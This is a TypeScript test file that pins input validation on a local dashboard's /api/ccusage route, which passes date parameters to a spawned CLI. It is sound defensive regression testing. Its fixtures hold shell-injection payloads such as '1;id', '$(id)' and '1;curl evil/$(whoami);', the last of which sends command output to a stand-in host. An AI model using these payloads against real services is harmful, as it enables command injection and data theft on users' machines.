// GET /api/ccusage read `since` and `until` straight off the query string and
// handed them to fetchCcusageDaily, which puts them in the argument vector of a
// spawned CLI. There was no validation of any kind, and a GET needs no CORS, no
// preflight and no ability to read the answer — so any page the user had open
// could aim `new Image().src = "http://127.0.0.1:4317/api/ccusage?since=…"` at
// the deck. The spawn no longer goes through a shell (ccusage-no-shell.test.ts
// pins that half), which makes this the second lock rather than the only one;
// it is also the one that keeps the pair honest if a shell is ever
// reintroduced downstream.
//
// These pin the grammar and pin that the route enforces it before anything gets
// near a child process.
import { describe, it, expect, afterAll, beforeAll } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { get, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";

// Temp home, set before the dynamic import: the server resolves its config
// directories at import time and the real ~/.claude must stay untouched.
const DIR = mkdtempSync(join(tmpdir(), "ccdeck-ccusage-range-"));
const prevEnv = { ...process.env };
process.env.HOME = DIR;
process.env.USERPROFILE = DIR;
process.env.CLAUDE_CONFIG_DIR = join(DIR, "claude");
process.env.CODEX_HOME = join(DIR, "codex");
// A request that gets PAST the gate reaches the real fetchCcusageDaily, and on
// this temp home there is no managed ccusage — so without this the accepted
// cases would each try to `npm install ccusage@latest` off the registry. With
// installs off, getRunner refuses immediately and nothing is ever spawned,
// which is all these tests need: the question is 400 versus not-400.
process.env.AGENTS_DECK_NO_INSTALL = "1";

// @ts-expect-error — .mjs server module, no types
const { startServer, isCliDate } = await import("../../server/index.mjs");

let server: Server;
let port = 0;

beforeAll(async () => {
  server = await startServer({ port: 0, host: "127.0.0.1", persist: null, codex: false });
  port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
  await new Promise<void>(done => {
    server.closeAllConnections?.();
    server.close(() => done());
  });
  for (const k of ["HOME", "USERPROFILE", "CLAUDE_CONFIG_DIR", "CODEX_HOME", "AGENTS_DECK_NO_INSTALL"]) {
    if (prevEnv[k] === undefined) delete process.env[k];
    else process.env[k] = prevEnv[k];
  }
  rmSync(DIR, { recursive: true, force: true });
});

function ccusage(query: string): Promise<{ status: number; body: Record<string, unknown> }> {
  return new Promise((resolve, reject) => {
    get({ host: "127.0.0.1", port, path: `/api/ccusage${query}` }, res => {
      let out = "";
      res.setEncoding("utf8");
      res.on("data", c => { out += c; });
      res.on("end", () => {
        try { resolve({ status: res.statusCode ?? 0, body: JSON.parse(out) }); }
        catch (e) { reject(e); }
      });
    }).on("error", reject);
  });
}

describe("isCliDate", () => {
  it("accepts a YYYYMMDD date and an absent parameter", () => {
    for (const ok of ["20260101", "19700101", "99999999", undefined]) {
      expect(isCliDate(ok)).toBe(true);
    }
  });

  it("refuses anything that is not eight digits", () => {
    for (const bad of [
      "1;id",            // the report's own payload
      "1;curl evil/$(whoami);",
      "2026-01-01",      // ISO, which ccusage's CLI does not take here
      "2026010",         // seven
      "202601011",       // nine
      "2026010a",
      " 20260101",
      "20260101 ",
      "$(id)",
      "`id`",
      "--help",
    ]) {
      expect(isCliDate(bad)).toBe(false);
    }
  });

  it("is a shape and not a calendar, deliberately", () => {
    // 99999999 is no more dangerous as an argv element than 20260101 is, and
    // what a date outside the logs means is ccusage's answer to give. Pinned so
    // nobody "fixes" this into a half-calendar that accepts 20260231 and
    // rejects 20260230.
    expect(isCliDate("99999999")).toBe(true);
    expect(isCliDate("20260231")).toBe(true);
    expect(isCliDate("20261301")).toBe(true);
  });
});

describe("GET /api/ccusage", () => {
  it("answers 400 for a since the shell would have read as syntax", async () => {
    const { status, body } = await ccusage("?since=1;id");

    expect(status).toBe(400);
    expect(body.ok).toBe(false);
    expect(body.reason).toBe("bad_range");
    // The refusal says what was expected, which is the whole job of a 400.
    expect(String(body.error)).toContain("YYYYMMDD");
  });

  it("answers 400 for the percent-encoded form too", async () => {
    // searchParams decodes, so `%3B` arrives as `;` — the shape the original
    // report used to get past a browser's URL handling.
    const { status, body } = await ccusage("?since=1%3Bcurl%20evil%2F%24(whoami)%3B");
    expect(status).toBe(400);
    expect(body.reason).toBe("bad_range");
  });

  it("validates until exactly as strictly as since", async () => {
    // until was the quieter half: the client never sends it, so nothing but a
    // test ever exercises it, and it reached the same argv.
    const { status, body } = await ccusage("?since=20260101&until=1;id");
    expect(status).toBe(400);
    expect(body.reason).toBe("bad_range");
  });

  it("lets a real YYYYMMDD range through", async () => {
    const { status, body } = await ccusage("?since=20260101&until=20260131");

    // Past the gate. What comes back is ccusage's own verdict — here "installs
    // are off", because this temp home has no managed copy — and the point is
    // only that the route did not refuse it.
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });

  it("still answers with both parameters absent", async () => {
    const { status, body } = await ccusage("");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });

  it("treats an empty since as absent rather than invalid", async () => {
    // `?since=` is what an unset input serialises to; it means "no opinion",
    // and ccusage.mjs fills in the default 30-day range.
    const { status, body } = await ccusage("?since=&until=");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });

  it("accepts eight digits that are not a real date", async () => {
    const { status, body } = await ccusage("?since=99999999");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });
});
